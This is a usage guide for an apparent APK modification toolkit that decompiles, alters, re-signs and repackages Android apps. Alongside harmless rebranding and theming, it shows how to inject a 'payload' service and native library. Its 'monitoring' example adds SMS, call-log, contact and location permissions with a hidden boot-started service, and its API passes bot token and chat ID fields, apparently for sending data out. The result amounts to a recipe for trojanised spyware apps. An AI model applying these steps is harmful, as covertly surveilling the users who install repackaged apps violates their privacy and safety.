# Advanced APK Modification - Complete Usage Guide

## 🎯 Overview

This guide covers all advanced APK modification features including:
- App name/version/package changes
- Icon and image replacement
- Permission/component injection
- Custom code injection
- Resource modification
- Native library addition
- And much more

## 📚 Table of Contents

1. [Basic Usage](#basic-usage)
2. [Name & Version Modification](#name--version-modification)
3. [Icon & Image Replacement](#icon--image-replacement)
4. [Permission Management](#permission-management)
5. [Component Injection](#component-injection)
6. [Code Injection](#code-injection)
7. [Resource Modification](#resource-modification)
8. [Native Library Addition](#native-library-addition)
9. [API Usage](#api-usage)
10. [Examples](#examples)

---

## Basic Usage

### Method 1: Python Script

```python
from utils.advanced_apk_modifier import AdvancedAPKModifier

# Initialize
modifier = AdvancedAPKModifier('input.apk', 'output_dir')

# Decompile
modifier.decompile()

# Apply modifications
modifier.change_app_name("My App")
modifier.change_version("2.0.0", 20)

# Recompile
output_apk = modifier.recompile()

# Sign
signed_apk = modifier.sign_apk(output_apk)

# Generate report
modifier.generate_report()
```

### Method 2: Web API

```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F "app_name=My Custom App" \
  -F "version_name=2.0.0" \
  -F "version_code=20"
```

---

## Name & Version Modification

### Change App Name

**Python:**
```python
modifier.change_app_name("My Custom Application")
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F "app_name=My Custom Application"
```

**What it does:**
- Updates `AndroidManifest.xml`
- Modifies `strings.xml`
- Changes displayed name in launcher

### Change Version

**Python:**
```python
# Change both name and code
modifier.change_version(version_name="3.5.1", version_code=351)

# Change only name
modifier.change_version(version_name="3.5.1")

# Change only code
modifier.change_version(version_code=351)
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F "version_name=3.5.1" \
  -F "version_code=351"
```

### Change Package Name

**Python:**
```python
modifier.change_package_name("com.mycustom.package")
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F "package_name=com.mycustom.package"
```

**⚠️ Note:** Full package rename requires additional smali file modifications.

---

## Icon & Image Replacement

### Replace App Icon

**Python:**
```python
modifier.replace_icon("path/to/custom_icon.png")
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F "icon=@custom_icon.png"
```

**What it does:**
- Generates icons for all densities:
  - mdpi: 48x48
  - hdpi: 72x72
  - xhdpi: 96x96
  - xxhdpi: 144x144
  - xxxhdpi: 192x192
- Replaces both square and round icons

### Replace Custom Image Resource

**Python:**
```python
# Replace a drawable
modifier.replace_image_resource(
    resource_name="logo",
    image_path="custom_logo.png",
    resource_type="drawable"
)

# Replace a splash screen
modifier.replace_image_resource(
    resource_name="splash_background",
    image_path="new_splash.png",
    resource_type="drawable"
)
```

---

## Permission Management

### Add Single Permission

**Python:**
```python
modifier.add_permissions(['android.permission.CAMERA'])
```

### Add Multiple Permissions

**Python:**
```python
permissions = [
    'android.permission.CAMERA',
    'android.permission.RECORD_AUDIO',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.READ_CONTACTS',
    'android.permission.READ_SMS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE'
]

modifier.add_permissions(permissions)
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F 'permissions=["android.permission.CAMERA","android.permission.INTERNET"]'
```

### Common Permissions List

```python
COMMON_PERMISSIONS = {
    # Storage
    'READ_EXTERNAL_STORAGE': 'android.permission.READ_EXTERNAL_STORAGE',
    'WRITE_EXTERNAL_STORAGE': 'android.permission.WRITE_EXTERNAL_STORAGE',
    
    # Camera & Microphone
    'CAMERA': 'android.permission.CAMERA',
    'RECORD_AUDIO': 'android.permission.RECORD_AUDIO',
    
    # Location
    'ACCESS_FINE_LOCATION': 'android.permission.ACCESS_FINE_LOCATION',
    'ACCESS_COARSE_LOCATION': 'android.permission.ACCESS_COARSE_LOCATION',
    
    # Phone & SMS
    'READ_PHONE_STATE': 'android.permission.READ_PHONE_STATE',
    'READ_SMS': 'android.permission.READ_SMS',
    'SEND_SMS': 'android.permission.SEND_SMS',
    'READ_CONTACTS': 'android.permission.READ_CONTACTS',
    'READ_CALL_LOG': 'android.permission.READ_CALL_LOG',
    
    # Network
    'INTERNET': 'android.permission.INTERNET',
    'ACCESS_NETWORK_STATE': 'android.permission.ACCESS_NETWORK_STATE',
    
    # System
    'RECEIVE_BOOT_COMPLETED': 'android.permission.RECEIVE_BOOT_COMPLETED',
    'SYSTEM_ALERT_WINDOW': 'android.permission.SYSTEM_ALERT_WINDOW'
}
```

---

## Component Injection

### Add Activity

**Python:**
```python
# Basic activity
modifier.add_activity(".CustomActivity", exported=False)

# Main launcher activity
modifier.add_activity(
    ".MainActivity",
    exported=True,
    main_launcher=True
)
```

### Add Service

**Python:**
```python
# Background service
modifier.add_service(".MonitoringService", exported=False)

# Exported service
modifier.add_service(".PublicService", exported=True, enabled=True)
```

### Add Broadcast Receiver

**Python:**
```python
# Boot receiver
modifier.add_receiver(
    ".BootReceiver",
    actions=['android.intent.action.BOOT_COMPLETED'],
    exported=True
)

# Custom receiver
modifier.add_receiver(
    ".CustomReceiver",
    actions=[
        'android.intent.action.BOOT_COMPLETED',
        'android.intent.action.USER_PRESENT'
    ]
)
```

---

## Code Injection

### Inject Smali Code into Existing Class

**Python:**
```python
# Inject into onCreate method
smali_code = """
    const-string v0, "Custom code injected!"
    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;)I
"""

modifier.inject_smali_code(
    target_class="com.example.MainActivity",
    smali_code=smali_code,
    method="onCreate"
)
```

### Add Complete New Class

**Python:**
```python
custom_class = """
.class public Lcom/custom/Helper;
.super Ljava/lang/Object;

.method public static init()V
    .locals 2
    
    const-string v0, "Helper"
    const-string v1, "Helper initialized"
    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    
    return-void
.end method
"""

modifier.add_smali_class("com.custom.Helper", custom_class)
```

### Inject Payload Service

**Python:**
```python
payload_service = """
.class public Lcom/payload/PayloadService;
.super Landroid/app/Service;

.method public onCreate()V
    .locals 0
    
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    
    # Your payload code here
    invoke-static {}, Lcom/payload/PayloadService;->startMonitoring()V
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public static startMonitoring()V
    .locals 2
    
    # Monitoring logic
    const-string v0, "Payload"
    const-string v1, "Monitoring started"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    return-void
.end method
"""

modifier.add_smali_class("com.payload.PayloadService", payload_service)
modifier.add_service(".PayloadService", exported=False)
```

---

## Resource Modification

### Modify String Resources

**Python:**
```python
string_changes = {
    'app_name': 'My Custom App',
    'welcome_message': 'Welcome to Custom App!',
    'about_text': 'This is a modified application',
    'button_text': 'Click Here',
    'error_message': 'An error occurred'
}

modifier.modify_strings(string_changes)
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F 'strings={"app_name":"My App","welcome_message":"Welcome!"}'
```

### Modify Color Resources

**Python:**
```python
color_changes = {
    'colorPrimary': '#FF5722',
    'colorPrimaryDark': '#E64A19',
    'colorAccent': '#FFC107',
    'backgroundColor': '#FFFFFF',
    'textColor': '#000000'
}

modifier.modify_colors(color_changes)
```

**API:**
```bash
curl -X POST http://localhost:5000/api/advanced/modify \
  -F "apk_file=@input.apk" \
  -F 'colors={"colorPrimary":"#FF5722","colorAccent":"#FFC107"}'
```

---

## Native Library Addition

### Add Custom Native Library

**Python:**
```python
# Add .so library for all architectures
modifier.add_native_library(
    lib_name="libcustom.so",
    lib_file_path="path/to/libcustom.so",
    architectures=['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']
)

# Add for specific architectures only
modifier.add_native_library(
    lib_name="libspecial.so",
    lib_file_path="path/to/libspecial.so",
    architectures=['arm64-v8a']
)
```

### Add Multiple Libraries

**Python:**
```python
libraries = [
    {
        'name': 'libxx.so',
        'path': 'libs/libxx.so'
    },
    {
        'name': 'libcrypto.so',
        'path': 'libs/libcrypto.so'
    },
    {
        'name': 'libpayload.so',
        'path': 'libs/libpayload.so'
    }
]

for lib in libraries:
    modifier.add_native_library(lib['name'], lib['path'])
```

---

## API Usage

### Complete Example with All Features

```python
import requests
import json

# API endpoint
url = "http://localhost:5000/api/advanced/modify"

# Prepare files
files = {
    'apk_file': open('input.apk', 'rb'),
    'icon': open('custom_icon.png', 'rb')
}

# Prepare data
data = {
    'app_name': 'My Custom App',
    'version_name': '2.0.0',
    'version_code': '20',
    'package_name': 'com.custom.app',
    'permissions': json.dumps([
        'android.permission.CAMERA',
        'android.permission.INTERNET'
    ]),
    'strings': json.dumps({
        'welcome_message': 'Welcome!',
        'about_text': 'Custom app'
    }),
    'colors': json.dumps({
        'colorPrimary': '#FF5722'
    }),
    'bot_token': 'YOUR_BOT_TOKEN',
    'chat_id': 'YOUR_CHAT_ID'
}

# Make request
response = requests.post(url, files=files, data=data)
result = response.json()

# Get job ID
job_id = result['job_id']
print(f"Job ID: {job_id}")

# Check status
status_url = f"http://localhost:5000/api/status/{job_id}"
status = requests.get(status_url).json()
print(f"Status: {status['status']}")
print(f"Progress: {status['progress']}%")

# Download when complete
if status['status'] == 'completed':
    download_url = f"http://localhost:5000/api/download/{job_id}"
    apk_data = requests.get(download_url)
    with open('modified.apk', 'wb') as f:
        f.write(apk_data.content)
    print("Downloaded: modified.apk")
```

---

## Examples

### Example 1: Rebrand APK

```python
modifier = AdvancedAPKModifier('original.apk', 'rebranded')

# Decompile
modifier.decompile()

# Change branding
modifier.change_app_name("Custom Brand App")
modifier.change_package_name("com.custombrand.app")
modifier.change_version("1.0.0", 100)

# Replace icon
modifier.replace_icon("new_brand_icon.png")

# Update strings
modifier.modify_strings({
    'app_name': 'Custom Brand App',
    'company_name': 'Custom Brand Inc.',
    'about_text': 'Powered by Custom Brand'
})

# Update colors to brand colors
modifier.modify_colors({
    'colorPrimary': '#1976D2',
    'colorPrimaryDark': '#0D47A1',
    'colorAccent': '#FFC107'
})

# Build
output = modifier.recompile()
signed = modifier.sign_apk(output)
modifier.generate_report()
```

### Example 2: Add Monitoring Features

```python
modifier = AdvancedAPKModifier('app.apk', 'monitored')

# Decompile
modifier.decompile()

# Add required permissions
monitoring_permissions = [
    'android.permission.READ_SMS',
    'android.permission.READ_CALL_LOG',
    'android.permission.READ_CONTACTS',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.INTERNET',
    'android.permission.RECEIVE_BOOT_COMPLETED'
]
modifier.add_permissions(monitoring_permissions)

# Add monitoring service
modifier.add_service(".MonitoringService", exported=False)

# Add boot receiver
modifier.add_receiver(
    ".BootReceiver",
    actions=['android.intent.action.BOOT_COMPLETED']
)

# Inject monitoring initialization
init_code = """
    invoke-static {}, Lcom/monitor/MonitoringService;->start(Landroid/content/Context;)V
"""
modifier.inject_smali_code("MainActivity", init_code, "onCreate")

# Build
output = modifier.recompile()
signed = modifier.sign_apk(output)
```

### Example 3: Create Themed Version

```python
modifier = AdvancedAPKModifier('base.apk', 'dark_theme')

# Decompile
modifier.decompile()

# Dark theme colors
dark_colors = {
    'colorPrimary': '#212121',
    'colorPrimaryDark': '#000000',
    'colorAccent': '#64FFDA',
    'backgroundColor': '#121212',
    'textColor': '#FFFFFF',
    'textColorSecondary': '#B0B0B0'
}
modifier.modify_colors(dark_colors)

# Update theme name
modifier.modify_strings({
    'app_name': 'App (Dark Theme)',
    'theme_name': 'Dark'
})

# Build
output = modifier.recompile()
signed = modifier.sign_apk(output)
```

---

## 🔧 Troubleshooting

### APK Won't Install

**Issue:** Modified APK fails to install

**Solutions:**
1. Ensure APK is properly signed
2. Uninstall original app first
3. Check signature conflicts
4. Verify package name is unique

### Features Not Working

**Issue:** Added features don't work

**Solutions:**
1. Check smali code syntax
2. Verify class names are correct
3. Ensure permissions are granted
4. Check logcat for errors

### Large APK Size

**Issue:** Modified APK is too large

**Solutions:**
1. Use ProGuard shrinking
2. Remove unused resources
3. Compress images
4. Optimize native libraries

---

## 📚 Additional Resources

- **Main Documentation:** See `README_SOURCE.md`
- **Build Instructions:** See `BUILD_INSTRUCTIONS.md`
- **Advanced Features:** See `ADVANCED_FEATURES.md`
- **Deployment Guide:** See `DEPLOYMENT_GUIDE.md`

---

**Version:** 2.0  
**Last Updated:** November 2025
